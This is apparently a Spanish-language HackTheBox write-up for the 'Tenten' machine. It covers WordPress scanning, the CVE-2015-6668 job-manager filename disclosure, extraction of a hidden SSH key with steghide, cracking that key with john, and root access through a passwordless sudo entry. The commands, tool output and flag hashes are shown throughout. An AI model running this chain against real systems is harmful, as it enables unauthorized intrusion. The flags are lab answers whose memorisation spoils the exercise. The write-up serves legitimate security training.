+	root@kali:~# wpscan --url http://10.10.10.10/ wpscan --url http://10.10.10.10/ --enumerate t --enumerate p --enumerate u 
+	_______________________________________________________________
+			 __          _______   _____
+			 \ \        / /  __ \ / ____|
+			  \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+			   \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+				\  /\  /  | |     ____) | (__| (_| | | | |
+				 \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+			 WordPress Security Scanner by the WPScan Team
+							 Version 3.8.1
+		   Sponsored by Automattic - https://automattic.com/
+		   @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+	_______________________________________________________________
+
+	[+] URL: http://10.10.10.10/ [10.10.10.10]
+	[+] Started: Mon May 18 06:55:48 2020
+
+	Interesting Finding(s):
+
+	[+] Headers
+	 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
+	 | Found By: Headers (Passive Detection)
+	 | Confidence: 100%
+
+	[+] XML-RPC seems to be enabled: http://10.10.10.10/xmlrpc.php
+	 | Found By: Direct Access (Aggressive Detection)
+	 | Confidence: 100%
+	 | References:
+	 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+	 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
+	 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
+	 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
+	 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access
+
+	[+] http://10.10.10.10/readme.html
+	 | Found By: Direct Access (Aggressive Detection)
+	 | Confidence: 100%
+
+	[+] The external WP-Cron seems to be enabled: http://10.10.10.10/wp-cron.php
+	 | Found By: Direct Access (Aggressive Detection)
+	 | Confidence: 60%
+	 | References:
+	 |  - https://www.iplocation.net/defend-wordpress-from-ddos
+	 |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+	[+] WordPress version 4.7.3 identified (Insecure, released on 2017-03-06).
+	 | Found By: Rss Generator (Passive Detection)
+	 |  - http://10.10.10.10/index.php/feed/, <generator>https://wordpress.org/?v=4.7.3</generator>
+	 |  - http://10.10.10.10/index.php/comments/feed/, <generator>https://wordpress.org/?v=4.7.3</generator>
+
+	[+] WordPress theme in use: twentyseventeen
+	 | Location: http://10.10.10.10/wp-content/themes/twentyseventeen/
+	 | Last Updated: 2020-03-31T00:00:00.000Z
+	 | Readme: http://10.10.10.10/wp-content/themes/twentyseventeen/README.txt
+	 | [!] The version is out of date, the latest version is 2.3
+	 | Style URL: http://10.10.10.10/wp-content/themes/twentyseventeen/style.css?ver=4.7.3
+	 | Style Name: Twenty Seventeen
+	 | Style URI: https://wordpress.org/themes/twentyseventeen/
+	 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
+	 | Author: the WordPress team
+	 | Author URI: https://wordpress.org/
+	 |
+	 | Found By: Css Style In Homepage (Passive Detection)
+	 |
+	 | Version: 1.1 (80% confidence)
+	 | Found By: Style (Passive Detection)
+	 |  - http://10.10.10.10/wp-content/themes/twentyseventeen/style.css?ver=4.7.3, Match: 'Version: 1.1'
+
+	[+] Enumerating Vulnerable Plugins (via Passive Methods)
+	[+] Checking Plugin Versions (via Passive and Aggressive Methods)
+
+	[i] No plugins Found.
+
+	[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)
+	 Checking Known Locations - Time: 00:00:02 <====================================================> (328 / 328) 100.00% Time: 00:00:02
+	[+] Checking Theme Versions (via Passive and Aggressive Methods)
+
+	[i] No themes Found.
+
+	[+] Enumerating Timthumbs (via Passive and Aggressive Methods)
+	 Checking Known Locations - Time: 00:02:30 <==================================================> (2575 / 2575) 100.00% Time: 00:02:30
+
+	[i] No Timthumbs Found.
+
+	[+] Enumerating Config Backups (via Passive and Aggressive Methods)
+	 Checking Config Backups - Time: 00:00:00 <=======================================================> (21 / 21) 100.00% Time: 00:00:00
+
+	[i] No Config Backups Found.
+
+	[+] Enumerating DB Exports (via Passive and Aggressive Methods)
+	 Checking DB Exports - Time: 00:00:00 <===========================================================> (36 / 36) 100.00% Time: 00:00:00
+
+	[i] No DB Exports Found.
+
+	[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to "Plain" for those to be detected)
+	 Brute Forcing Attachment IDs - Time: 00:00:02 <================================================> (100 / 100) 100.00% Time: 00:00:02
+
+	[i] No Medias Found.
+
+	[+] Enumerating Users (via Passive and Aggressive Methods)
+	 Brute Forcing Author IDs - Time: 00:00:00 <======================================================> (10 / 10) 100.00% Time: 00:00:00
+
+	[i] User(s) Identified:
+
+	[+] takis
+	 | Found By: Author Posts - Author Pattern (Passive Detection)
+	 | Confirmed By:
+	 |  Rss Generator (Passive Detection)
+	 |  Wp Json Api (Aggressive Detection)
+	 |   - http://10.10.10.10/index.php/wp-json/wp/v2/users/?per_page=100&page=1
+	 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+	 |  Login Error Messages (Aggressive Detection)
+
+	[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
+	[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up
+
+	[+] Finished: Mon May 18 06:58:28 2020
+	[+] Requests Done: 3073
+	[+] Cached Requests: 53
+	[+] Data Sent: 757.412 KB
+	[+] Data Received: 440.49 KB
+	[+] Memory used: 247.957 MB
+	[+] Elapsed time: 00:02:39
+
+
+-- Aplicacion searchsploit.
+
+	searchsploit Apache 2.4
+	------------------------------------------------------------------------------------------------- ---------------------------------
+	 Exploit Title                                                                                   |  Path
+	------------------------------------------------------------------------------------------------- ---------------------------------
+	Apache 2.4.17 - Denial of Service                                                                | windows/dos/39037.php
+	Apache 2.4.17 < 2.4.38 - 'apache2ctl graceful' 'logrotate' Local Privilege Escalation            | linux/local/46676.php
+	Apache 2.4.23 mod_http2 - Denial of Service                                                      | linux/dos/40909.py
+	Apache 2.4.7 + PHP 7.0.2 - 'openssl_seal()' Uninitialized Memory Code Execution                  | php/remote/40142.php
+	Apache 2.4.7 mod_status - Scoreboard Handling Race Condition                                     | linux/dos/34133.txt
+	Apache < 2.2.34 / < 2.4.27 - OPTIONS Memory Leak                                                 | linux/webapps/42745.py
+	Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Overflow                             | unix/remote/21671.c
+	Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (1)                       | unix/remote/764.c
+	Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)                       | unix/remote/47080.c
+	Apache Xerces-C XML Parser < 3.1.2 - Denial of Service (PoC)                                     | linux/dos/36906.txt
+	Webfroot Shoutbox < 2.32 (Apache) - Local File Inclusion / Remote Code Execution                 | linux/remote/34.pl
+	------------------------------------------------------------------------------------------------- ---------------------------------
+
+	searchsploit wordpress 4.7
+	
+	---------------------------------------------------------------------------- ---------------------------------
+	 Exploit Title                                                              |  Path
+	---------------------------------------------------------------------------- ---------------------------------
+	WordPress Core 4.7.0/4.7.1 - Content Injection (Python)                  	| linux/webapps/41223.py
+	WordPress Core 4.7.0/4.7.1 - Content Injection (Ruby)                      	| linux/webapps/41224.rb
+	WordPress Core < 4.7.1 - Username Enumeration                              	| php/webapps/41497.php
+	WordPress Core < 4.7.4 - Unauthorized Password Reset                        | linux/webapps/41963.txt
+	WordPress Core < 4.9.6 - (Authenticated) Arbitrary File Deletion            | php/webapps/44949.txt
+	WordPress Core < 5.2.3 - Viewing Unauthenticated/Password/Private Posts     | multiple/webapps/47690.md
+	WordPress Core < 5.3.x - 'xmlrpc.php' Denial of Service                     | php/dos/47800.py
+
+
++++++ FASE DE EXPLOTACION ++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+//////////////////////////// OPCION 1 ////////////////////////////////////////////
+
+	En la web 10.10.10.10 --> pulsar en Jobs Listing --> Pulso en Pen Tester  --> Apply Now .
+	Cumplimentar Name, Surname, mail, aceptar los terminos y en upload your cv, Subir una imagen jpg. Funciona
+	Confirmar que se ha subido: http://10.10.10.10/wp-content/uploads/2020/05/header.jpg
+	*/2020/05/ --> es la fecha que lo he subido y header.jpg --> fichero subido.
+	
+	Introducir los datos, donde se ha subido el fichero el link es:  http://10.10.10.10/index.php/jobs/apply/8/
+	Si se cambia el 8 por numeros seguidos, al llegar al 13 aparece el titulo Title: HackerAccessGranted.
+	Comprobar este usuario, con la fecha que se puso en el blog 2017-04-01.
+	http://10.10.10.10/wp-content/uploads/2017/04/HackerAccessGranted.jpg
+	Nos aparece una imagen con un texto Access Granted.	Guardar la imagen.
+	
+	Utilizar el exploit https://github.com/StefanoDeVuono/steghide
+	Para que funcione instalar:
+	# apt install -y libjpeg-dev libmhash-dev libmcrypt-dev
+	Buscar los datos de la imagen.
+	# steghide extract -sf HackerAccessGranted.jpg 
+	Se obtiene un fichero clave "id_rsa"
+	
+	Para decodificador utilizar ssh2john.py (lo tiene kali por defecto /usr/share/john/ssh2john.py )
+	Ejecutar: usr/share/john/ssh2john.py id_rsa > id_rsa.login
+	Se crea el fichero clave login (id_rsa.login)
+	
+	Se descifra con john the ripper.
+	#  /usr/sbin/john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.login
+	
+		Created directory: /root/.john
+		Using default input encoding: UTF-8
+		Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
+		Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+		Cost 2 (iteration count) is 1 for all loaded hashes
+		Will run 4 OpenMP threads
+		Note: This format may emit false positives, so it will keep trying even after
+		finding a possible candidate.
+		Press 'q' or Ctrl-C to abort, almost any other key for status
+		superpassword    (id_rsa)
+		Warning: Only 2 candidates left, minimum 4 needed for performance.
+		1g 0:00:00:04 DONE (2020-05-18 12:31) 0.2164g/s 3104Kp/s 3104Kc/s 3104KC/sa6_123..*7¡Vamos!
+		Session completed
+	
+	Dar pemisos al fichero id_rsa: chmod 600 id_rsa
+	
+	Probar acceso por ssh:
+		ssh -i id_rsa takis@10.10.10.10
+		password : superpassword
+		Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)
+
+		 * Documentation:  https://help.ubuntu.com
+		 * Management:     https://landscape.canonical.com
+		 * Support:        https://ubuntu.com/advantage
+
+		65 packages can be updated.
+		39 updates are security updates.
+
+		takis@tenten:~$ 
+	
+-- ELEVAR PRIVILEGIOS:
+
+	takis@tenten:/$ sudo -l
+		Matching Defaults entries for takis on tenten:
+			env_reset, mail_badpass, 
+			secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+		User takis may run the following commands on tenten:
+			(ALL : ALL) ALL
+			(ALL) NOPASSWD: /bin/fuckin
+
+	takis@tenten:/$ sudo /bin/fuckin bash
+		root@tenten:/# whoami
+		root
+
+
+//////////////////////////// OPCION 2 ////////////////////////////////////////////
+
+	*Con la aplicación actual de wpscan 3.x no muestra la vulnerabilidad cve-2015-6668 (Utilizar la version 2.x, si se quiere comprobar)
+	Fuente: https://vagmour.eu/cve-2015-6668-cv-filename-disclosure-on-job-manager-wordpress-plugin/
+	Crear un fichero python, por ejemplo exploit.py con el codigo que viene en la web anterior.
+	Modificar el fichero exploit.py, por la fecha actual y formato permitido.
+		for year in range(2020,2016):  
+		for i in range(1,13):
+			for extension in {'jpg','jpeg','png'}:
+ 	
+	En la web 10.10.10.10 --> pulsar en Jobs Listing --> Pulsar en Pen Tester  --> Apply Now .
+	Cumplimentar Name, Surname, mail, aceptar los terminos y en upload your cv, Subir una imagen jpg. Funciona.
+	Confirmar que se ha subido: http://10.10.10.10/wp-content/uploads/2020/05/header.jpg
+	*/2020/05/ --> es la fecha que lo he subido y header.jpg --> fichero subido
+	
+	Se compueba que hay usuario, al ver el codigo de la web ejecutar el siguiente codigo, para buscar mas usuarios.
+	# for i in $(seq 1 30); do echo -n "$i: "; curl -s http://10.10.10.10/index.php/jobs/apply/$i/ | grep '<title>'; done
+		1: <title>Job Application: Hello world! &#8211; Job Portal</title>
+		2: <title>Job Application: Sample Page &#8211; Job Portal</title>
+		3: <title>Job Application: Auto Draft &#8211; Job Portal</title>
+		4: <title>Job Application &#8211; Job Portal</title>
+		5: <title>Job Application: Jobs Listing &#8211; Job Portal</title>
+		6: <title>Job Application: Job Application &#8211; Job Portal</title>
+		7: <title>Job Application: Register &#8211; Job Portal</title>
+		8: <title>Job Application: Pen Tester &#8211; Job Portal</title>
+		9: <title>Job Application:  &#8211; Job Portal</title>
+		10: <title>Job Application: Application &#8211; Job Portal</title>
+		11: <title>Job Application: cube &#8211; Job Portal</title>
+		12: <title>Job Application: Application &#8211; Job Portal</title>
+		13: <title>Job Application: HackerAccessGranted &#8211; Job Portal</title>
+		14: <title>Job Application: Application &#8211; Job Portal</title>
+		15: <title>Job Application: header &#8211; Job Portal</title>
+		16: <title>Job Application &#8211; Job Portal</title>
+		17: <title>Job Application &#8211; Job Portal</title>
+		18: <title>Job Application &#8211; Job Portal</title>
+		19: <title>Job Application &#8211; Job Portal</title>
+		20: <title>Job Application &#8211; Job Portal</title>
+		21: <title>Job Application &#8211; Job Portal</title>
+		22: <title>Job Application &#8211; Job Portal</title>
+		23: <title>Job Application &#8211; Job Portal</title>
+		24: <title>Job Application &#8211; Job Portal</title>
+		25: <title>Job Application &#8211; Job Portal</title>
+		26: <title>Job Application &#8211; Job Portal</title>
+		27: <title>Job Application &#8211; Job Portal</title>
+		28: <title>Job Application &#8211; Job Portal</title>
+		29: <title>Job Application &#8211; Job Portal</title>
+		30: <title>Job Application &#8211; Job Portal</title>
+		* Confirmar que hay hasta 15. 
+
+	Ejecutar el exploit:
+	root@kali:~/Desktop/HACKTHEBOX/Temten_10.10.10.10# python exploit.py 
+																																															   
+		CVE-2015-6668                                                                                                                                                                              
+		Title: CV filename disclosure on Job-Manager WP Plugin                                                                                                                                     
+		Author: Evangelos Mourikis                                                                                                                                                                 
+		Blog: https://vagmour.eu                                                                                                                                                                   
+		Plugin URL: http://www.wp-jobmanager.com                                                                                                                                                   
+		Versions: <=0.7.25                                                                                                                                                                         
+																																																   
+		Enter a vulnerable website: http://10.10.10.10                                                                                                                                             
+		Enter a file name: HackerAccessGranted 
+	*Confirmar que esta el fichero.
+	http://10.10.10.10/wp-content/uploads/2017/04/HackerAccessGranted.jpg
+	Nos muestra una imagen con un texto Access Granted.	Guardar la imagen.
+	
+	Utilizar el exploit https://github.com/StefanoDeVuono/steghide
+	Para que funcione instalar:
+	# apt install -y libjpeg-dev libmhash-dev libmcrypt-dev
+	Buscar los datos de la imagen.
+	# steghide extract -sf HackerAccessGranted.jpg 
+	Se obtiene un fichero clave "id_rsa"
+	
+	Se descifra con john the ripper.
+	#  /usr/sbin/john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.login
+	
+		Created directory: /root/.john
+		Using default input encoding: UTF-8
+		Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
+		Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+		Cost 2 (iteration count) is 1 for all loaded hashes
+		Will run 4 OpenMP threads
+		Note: This format may emit false positives, so it will keep trying even after
+		finding a possible candidate.
+		Press 'q' or Ctrl-C to abort, almost any other key for status
+		superpassword    (id_rsa)
+		Warning: Only 2 candidates left, minimum 4 needed for performance.
+		1g 0:00:00:04 DONE (2020-05-18 12:31) 0.2164g/s 3104Kp/s 3104Kc/s 3104KC/sa6_123..*7¡Vamos!
+		Session completed
+	
+	Dar pemisos al fichero id_rsa: chmod 600 id_rsa
+	
+	Probar acceso por ssh:
+	# ssh -i id_rsa takis@10.10.10.10
+		password : superpassword
+		Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)
+
+		 * Documentation:  https://help.ubuntu.com
+		 * Management:     https://landscape.canonical.com
+		 * Support:        https://ubuntu.com/advantage
+
+		65 packages can be updated.
+		39 updates are security updates.
+
+		takis@tenten:~$ 
+		* Se consigue acceso como usuario.
+	
+-- ELEVAR PRIVILEGIOS:
+
+	takis@tenten:/$ sudo -l
+		Matching Defaults entries for takis on tenten:
+			env_reset, mail_badpass, 
+			secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+		User takis may run the following commands on tenten:
+			(ALL : ALL) ALL
+			(ALL) NOPASSWD: /bin/fuckin
+
+	takis@tenten:/$ sudo /bin/fuckin bash
+		root@tenten:/# whoami
+		root
+
++++++ FASE DE POSTEXPLOTACION ++++++++++++++++++++++++++++++++++++
+
+	FLAG USUARIO:
+	takis@tenten:~$ more /home/takis/user.txt 
+	e5c7ed3b89e73049c04c432fc8686f31
+
+	FLAG ROOT:
+	root@tenten:/root# more /root/root.txt 
+	f9f7291e39a9a2a011b1425c3e08f603
+
+
+
+
